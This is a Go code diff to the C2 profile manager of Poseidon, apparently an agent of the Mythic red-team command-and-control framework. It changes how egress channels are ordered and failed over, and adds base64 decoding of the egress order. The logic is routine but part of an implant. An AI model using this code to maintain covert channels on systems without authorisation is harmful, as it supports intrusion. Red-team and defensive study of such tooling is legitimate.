@@ -2,6 +2,7 @@ package profiles
 
 import (
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
@@ -61,7 +62,11 @@ func RegisterAvailableC2Profile(newProfile structs.Profile) {
 
 // Initialize parses the connection order information and threshold counts from compilation
 func Initialize() {
-	err := json.Unmarshal([]byte(egress_order), &egressOrder)
+	egressOrderBytes, err := base64.StdEncoding.DecodeString(egress_order)
+	if err != nil {
+		log.Fatalf("Failed to parse egress order bytes")
+	}
+	err = json.Unmarshal(egressOrderBytes, &egressOrder)
 	if err != nil {
 		log.Fatalf("Failed to parse connection orders: %v", err)
 	}
@@ -76,14 +81,29 @@ func Initialize() {
 	}
 	utils.PrintDebug(fmt.Sprintf("Initial Egress order: %v", egressOrder))
 }
+func sliceContainsString(sl []string, s string) bool {
+	for _, x := range sl {
+		if x == s {
+			return true
+		}
+	}
+	return false
+}
 
 // Start kicks off one egress and the p2p profiles
 func Start() {
 	// start one egress
 	installedC2 := []string{}
+	// get a list of all installed c2 that match egress order
 	for _, egressC2 := range egressOrder {
 		if _, ok := availableC2Profiles[egressC2]; ok {
 			installedC2 = append(installedC2, egressC2)
+		}
+	}
+	// append to the end any installed c2 that wasn't listed in the egress order
+	for c2, _ := range availableC2Profiles {
+		if !sliceContainsString(installedC2, c2) {
+			installedC2 = append(installedC2, c2)
 		}
 	}
 	egressOrder = installedC2
@@ -158,7 +178,7 @@ func StartNextEgress(failedConnectionC2Profile string) {
 	if !egressC2StillRunning {
 		utils.PrintDebug(fmt.Sprintf("No more egress c2 profiles running, start the next\n"))
 		// update the connectionID and wrap around if necessary
-		if egress_failover == "round-robin" {
+		if egress_failover == "failover" {
 			currentConnectionID = (currentConnectionID + 1) % len(egressOrder)
 		}
 		// start the next egress
